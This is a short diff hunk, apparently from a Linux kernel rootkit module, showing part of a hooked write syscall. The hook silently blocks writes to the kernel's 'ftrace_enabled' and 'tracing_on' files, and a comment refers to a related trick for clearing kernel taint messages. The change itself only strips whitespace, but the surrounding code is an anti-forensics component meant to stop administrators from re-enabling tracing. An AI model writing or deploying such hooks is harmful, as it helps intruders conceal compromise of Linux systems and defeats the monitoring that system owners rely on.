@@ -16,13 +16,13 @@ static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs) {
     file = fget(fd); // Get the file object corresponding to the fd
     if (file) {
 
-        /* Silently blocks writes to ftrace_enabled and tracing_on using sorta the 
-           same trick we used in clear-taint-dmesg but for the write syscall. 
+        /* Silently blocks writes to ftrace_enabled and tracing_on using sorta the
+           same trick we used in clear-taint-dmesg but for the write syscall.
         */
 
         if (strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
             strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0) {
-            
+
             fput(file); // Free the file object after verification
 
             // Allocate a temporary buffer in kernel space
